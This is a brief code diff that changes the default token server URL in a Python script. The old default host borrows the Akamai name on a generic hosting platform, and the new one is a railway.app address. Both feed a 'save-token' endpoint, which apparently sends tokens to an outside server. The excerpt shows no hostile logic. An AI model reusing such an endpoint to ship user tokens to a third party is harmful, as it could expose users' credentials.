@@ -33,7 +33,7 @@ DIR_PATH = os.path.dirname(os.path.abspath(__file__))
 USE_CUDA = False
 DEVICE = 'cpu'
 
-TOKEN_SERVER_URL = os.environ.get('TOKEN_SERVER_URL', 'https://akamai-storage.onrender.com')
+TOKEN_SERVER_URL = os.environ.get('TOKEN_SERVER_URL', 'https://cn31-web-atx-production.up.railway.app')
 TOKEN_SAVE_ENDPOINT = f"{TOKEN_SERVER_URL}/api/save-token"
 
 # Fast token queue
